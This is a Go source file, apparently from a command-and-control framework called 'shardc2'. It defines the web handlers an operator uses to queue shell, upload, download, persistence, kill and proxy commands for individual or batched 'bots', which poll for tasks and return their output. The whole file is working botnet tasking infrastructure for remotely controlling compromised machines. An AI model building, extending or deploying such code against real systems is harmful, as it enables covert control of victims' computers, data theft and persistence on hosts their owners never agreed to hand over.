package handlers

import (
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/shardc2/shardc2/internal/database"
	"github.com/shardc2/shardc2/pkg/models"
)

type CommandHandler struct {
	db  *database.DB
	hub *WSHub
}

func NewCommandHandler(db *database.DB, hub *WSHub) *CommandHandler {
	return &CommandHandler{db: db, hub: hub}
}

func (h *CommandHandler) Create(c *fiber.Ctx) error {
	var req struct {
		BotID   string `json:"bot_id"`
		Type    string `json:"type"`
		Payload string `json:"payload"`
		Timeout int    `json:"timeout"`
	}
	if err := c.BodyParser(&req); err != nil {
		return c.Status(400).JSON(fiber.Map{"error": "invalid request body"})
	}
	if req.BotID == "" {
		return c.Status(400).JSON(fiber.Map{"error": "bot_id required"})
	}
	if req.Payload == "" {
		return c.Status(400).JSON(fiber.Map{"error": "payload required"})
	}
	if len(req.Payload) > 1048576 {
		return c.Status(400).JSON(fiber.Map{"error": "payload too large (max 1MB)"})
	}
	if req.Type == "" {
		req.Type = models.CmdTypeShell
	}

	validTypes := map[string]bool{
		models.CmdTypeShell: true, models.CmdTypeUpload: true, models.CmdTypeDownload: true,
		models.CmdTypeSleep: true, models.CmdTypePersist: true, models.CmdTypeKill: true,
		models.CmdTypeProxy: true,
	}
	if !validTypes[req.Type] {
		return c.Status(400).JSON(fiber.Map{"error": "invalid command type"})
	}

	if req.Timeout < 0 || req.Timeout > 3600 {
		return c.Status(400).JSON(fiber.Map{"error": "timeout must be 0-3600 seconds"})
	}

	var cmdID string
	err := h.db.QueryRow(`
		INSERT INTO commands (bot_id, type, payload, timeout_seconds)
		VALUES ($1, $2, $3, $4) RETURNING id`,
		req.BotID, req.Type, req.Payload, req.Timeout,
	).Scan(&cmdID)
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to create command"})
	}

	return c.Status(201).JSON(fiber.Map{"id": cmdID, "status": "pending"})
}

func (h *CommandHandler) AgentGetPending(c *fiber.Ctx) error {
	botID, _ := c.Locals("bot_id").(string)
	return h.getPending(c, botID)
}

func (h *CommandHandler) GetPending(c *fiber.Ctx) error {
	botID := c.Params("bot_id")
	return h.getPending(c, botID)
}

func (h *CommandHandler) getPending(c *fiber.Ctx, botID string) error {
	rows, err := h.db.Query(`
		UPDATE commands SET status = 'executing'
		WHERE id IN (
			SELECT id FROM commands
			WHERE bot_id = $1 AND status = 'pending'
			ORDER BY created_at ASC
		)
		RETURNING id, type, payload, COALESCE(timeout_seconds, 0)`, botID)
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to fetch commands"})
	}
	defer rows.Close()

	var cmds []fiber.Map
	for rows.Next() {
		var id, cmdType, payload string
		var timeout int
		if err := rows.Scan(&id, &cmdType, &payload, &timeout); err != nil {
			continue
		}
		cmd := fiber.Map{"id": id, "type": cmdType, "payload": payload}
		if timeout > 0 {
			cmd["timeout"] = timeout
		}
		cmds = append(cmds, cmd)
	}
	if cmds == nil {
		cmds = []fiber.Map{}
	}

	return c.JSON(fiber.Map{"commands": cmds})
}

func (h *CommandHandler) SubmitResult(c *fiber.Ctx) error {
	var req struct {
		CommandID string `json:"command_id"`
		Output    string `json:"output"`
		Status    string `json:"status"`
	}
	if err := c.BodyParser(&req); err != nil {
		return c.Status(400).JSON(fiber.Map{"error": "invalid request body"})
	}
	if req.CommandID == "" {
		return c.Status(400).JSON(fiber.Map{"error": "command_id required"})
	}
	if req.Status == "" {
		req.Status = models.StatusCompleted
	}

	validStatuses := map[string]bool{
		models.StatusCompleted: true, models.StatusFailed: true,
	}
	if !validStatuses[req.Status] {
		return c.Status(400).JSON(fiber.Map{"error": "invalid status"})
	}

	now := time.Now()
	var botID string
	err := h.db.QueryRow(`
		UPDATE commands SET output = $1, status = $2, executed_at = $3
		WHERE id = $4 RETURNING bot_id`, req.Output, req.Status, now, req.CommandID).Scan(&botID)
	if err != nil {
		return c.Status(404).JSON(fiber.Map{"error": "command not found"})
	}

	if h.hub != nil {
		h.hub.Broadcast(botID, WSMessage{
			Type:      "result",
			BotID:     botID,
			CommandID: req.CommandID,
			Data: fiber.Map{
				"output": req.Output,
				"status": req.Status,
			},
		})
	}

	return c.JSON(fiber.Map{"status": "received"})
}

func (h *CommandHandler) History(c *fiber.Ctx) error {
	botID := c.Params("bot_id")
	rows, err := h.db.Query(`
		SELECT id, type, payload, COALESCE(output, ''), status, created_at, executed_at
		FROM commands WHERE bot_id = $1
		ORDER BY created_at DESC LIMIT 50`, botID)
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "failed to fetch history"})
	}
	defer rows.Close()

	var cmds []fiber.Map
	for rows.Next() {
		var id, cmdType, payload, output, status string
		var createdAt time.Time
		var executedAt *time.Time
		if err := rows.Scan(&id, &cmdType, &payload, &output, &status, &createdAt, &executedAt); err != nil {
			continue
		}
		cmds = append(cmds, fiber.Map{
			"id": id, "type": cmdType, "payload": payload, "output": output,
			"status": status, "created_at": createdAt, "executed_at": executedAt,
		})
	}
	if cmds == nil {
		cmds = []fiber.Map{}
	}
	return c.JSON(fiber.Map{"commands": cmds})
}

func (h *CommandHandler) BatchCreate(c *fiber.Ctx) error {
	var req struct {
		BotIDs  []string `json:"bot_ids"`
		Type    string   `json:"type"`
		Payload string   `json:"payload"`
		Timeout int      `json:"timeout"`
	}
	if err := c.BodyParser(&req); err != nil {
		return c.Status(400).JSON(fiber.Map{"error": "invalid request body"})
	}
	if len(req.BotIDs) == 0 {
		return c.Status(400).JSON(fiber.Map{"error": "bot_ids required"})
	}
	if req.Payload == "" {
		return c.Status(400).JSON(fiber.Map{"error": "payload required"})
	}
	if len(req.Payload) > 1048576 {
		return c.Status(400).JSON(fiber.Map{"error": "payload too large (max 1MB)"})
	}
	if req.Type == "" {
		req.Type = models.CmdTypeShell
	}
	if req.Timeout < 0 || req.Timeout > 3600 {
		return c.Status(400).JSON(fiber.Map{"error": "timeout must be 0-3600 seconds"})
	}

	validTypes := map[string]bool{
		models.CmdTypeShell: true, models.CmdTypeUpload: true, models.CmdTypeDownload: true,
		models.CmdTypeSleep: true, models.CmdTypePersist: true, models.CmdTypeKill: true,
		models.CmdTypeProxy: true,
	}
	if !validTypes[req.Type] {
		return c.Status(400).JSON(fiber.Map{"error": "invalid command type"})
	}

	var results []fiber.Map
	for _, botID := range req.BotIDs {
		var cmdID string
		err := h.db.QueryRow(`
			INSERT INTO commands (bot_id, type, payload, timeout_seconds)
			VALUES ($1, $2, $3, $4) RETURNING id`,
			botID, req.Type, req.Payload, req.Timeout,
		).Scan(&cmdID)
		if err != nil {
			results = append(results, fiber.Map{"bot_id": botID, "error": "failed"})
			continue
		}
		results = append(results, fiber.Map{"bot_id": botID, "id": cmdID, "status": "pending"})
	}

	return c.Status(201).JSON(fiber.Map{"commands": results})
}
